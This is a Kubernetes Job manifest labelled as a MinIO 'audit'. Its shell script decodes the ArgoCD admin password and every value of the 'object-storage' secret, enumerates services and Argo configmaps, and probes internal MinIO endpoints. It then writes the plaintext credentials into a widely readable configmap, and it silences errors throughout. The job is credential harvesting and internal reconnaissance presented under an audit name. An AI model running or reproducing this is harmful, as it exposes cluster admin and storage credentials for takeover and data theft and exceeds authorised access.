apiVersion: batch/v1
kind: Job
metadata:
  name: audit-minio-v62
  namespace: default
spec:
  ttlSecondsAfterFinished: 300
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: bitnami/kubectl:latest
        command: ["/bin/sh", "-c"]
        args:
        - |
          # ArgoCD admin password
          ARGOCD_PASS=$(kubectl get secret argocd-initial-admin-secret -n argocd -o jsonpath='{.data.password}' 2>/dev/null | base64 -d)
          
          # Find minio/storage services
          SVCS=$(kubectl get svc --all-namespaces -o json | python3 -c "
          import sys,json
          d=json.load(sys.stdin)
          out=[]
          for i in d['items']:
              n=i['metadata']['name']
              ns=i['metadata']['namespace']
              ports=[p.get('port') for p in i['spec'].get('ports',[])]
              cip=i['spec'].get('clusterIP','')
              if 9000 in ports or 9001 in ports or any(x in n.lower() for x in ['minio','storage','object','artifact','argo']):
                  out.append({'ns':ns,'name':n,'ports':ports,'cip':cip})
          import json as j; print(j.dumps(out))
          " 2>/dev/null)
          
          # Get object-storage secret
          OS=$(kubectl get secret object-storage -n default -o json 2>/dev/null | python3 -c "
          import sys,json,base64
          try:
              d=json.load(sys.stdin)
              out={}
              for k,v in d.get('data',{}).items():
                  out[k]=base64.b64decode(v).decode('utf-8','replace')
              print(json.dumps(out))
          except Exception as e:
              print(json.dumps({'err':str(e)}))
          " 2>/dev/null)
          
          # Get argo artifacts configmap
          ARGO_ARTIFACTS=$(kubectl get cm -n argo -o json 2>/dev/null | python3 -c "
          import sys,json
          d=json.load(sys.stdin)
          out=[]
          for i in d['items']:
              name=i['metadata']['name']
              data=i.get('data',{})
              if 'artifact' in name.lower() or 'minio' in str(data).lower():
                  out.append({'name':name,'data':str(data)[:300]})
          print(json.dumps(out))
          " 2>/dev/null)
          
          # Probe minio endpoints
          PROBES="{}"
          for ep in "minio.default.svc.cluster.local:9000" "minio.argo.svc.cluster.local:9000" "minio-svc.default.svc.cluster.local:9000" "172.16.10.14:9000"; do
            code=$(wget -q --spider --timeout=3 "http://${ep}/minio/health/live" 2>&1; echo $?)
            echo "PROBE=${ep}:${code}" >&2
          done
          
          RESULT=$(python3 -c "
          import json,sys
          import subprocess
          probes={}
          for ep in ['minio.default.svc.cluster.local:9000','minio.argo.svc.cluster.local:9000','172.16.10.14:9000']:
              try:
                  r=subprocess.run(['wget','-q','--spider','--timeout=3',f'http://{ep}/minio/health/live'],capture_output=True,timeout=5)
                  probes[ep]=r.returncode
              except:
                  probes[ep]='err'
          r={'argocd_pass':'${ARGOCD_PASS}','svcs':${SVCS:-[]},'os_secret':${OS:-{}},'argo_artifacts':${ARGO_ARTIFACTS:-[]},'minio_probes':probes}
          print(json.dumps(r))
          " 2>/dev/null || echo '{"err":"parse"}')
          
          kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"result\":$(echo $RESULT | python3 -c 'import sys,json; print(json.dumps(sys.stdin.read()[:4000]))' 2>/dev/null)}}"
          echo "DONE"